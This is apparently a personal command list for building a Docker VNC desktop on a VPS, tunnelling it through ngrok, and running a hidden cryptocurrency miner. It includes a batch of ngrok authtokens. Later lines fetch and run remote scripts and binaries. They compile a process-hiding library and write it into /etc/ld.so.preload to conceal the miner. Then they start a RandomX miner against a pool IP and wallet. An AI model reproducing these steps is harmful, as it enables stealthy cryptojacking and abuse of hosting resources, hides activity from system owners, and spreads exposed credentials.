# creat vps docker vnc : 
- install docker : apt install -y apt-transport-https ca-certificates curl software-properties-common && curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg && echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null && apt update && apt install -y docker-ce docker-ce-cli containerd.io && usermod -aG docker $USER && service docker restart
- docker run -it --rm -p 6080:80 -p 5900:5900 dorowu/ubuntu-desktop-lxde-vnc
- wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz && tar -xf ngrok-v3-stable-linux-amd64.tgz && ./ngrok config add-authtoken 2eqKuowsYAQzDkn0uAG8WWxxfTy_4MWVSLvDjfSCWgPsQVbm5
- ./ngrok http 6080
  
   token ngrok :
- 2TtAcvy5faRWDPlmnbt2tauuMfy_J8rCNerKtLqLeJqrMTGY
- 2TY9j0ZPVtJfGB3HQPVxoIAcKR6_2sqBzNTKDZnacRm9hJtFK
- 2U9omfblkr1JR4VhgmIQwk0XkaP_2MRDsYsLaWzj2ouhqVCaY
- 2UEc6WUEbjbA3JpjmWfem5IZFzK_6EyQFfMJ1amaocetmur7q
- 2UbN0YLLgdPR7xDmmkMPtaTMxRd_7YiSYjH3rcoXKt5goPE6Q
- 2eqK7m0aHI98zyKc5kutUVwk5xe_44hNpSjdL1HSGtftH5dso
- 2eqKuowsYAQzDkn0uAG8WWxxfTy_4MWVSLvDjfSCWgPsQVbm5

  create proxy pool :
  kill port : apt-get install psmisc -y && fuser -k 4050/tcp
- wget https://raw.githubusercontent.com/bulboni/minware/main/proxm.py && nohup python3 proxm.py
  
  step mining :
- hide miner no gcc: git clone https://github.com/cihuuy/libn && cd libn && apt install gcc -y && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
- hide miner wiht gcc: git clone https://github.com/cihuuy/libn && cd libn && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
  download and runing miner 2 core :
wget https://raw.githubusercontent.com/bulboni/sumocn/main/durex && chmod +x durex && ./durex --algorithm RandomX --pool 158.69.251.105:4050 --wallet SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37PhpeamiMK2Zc3hSSyb6Y4p --password sx1 --cpu-threads 6 --disable-gpu
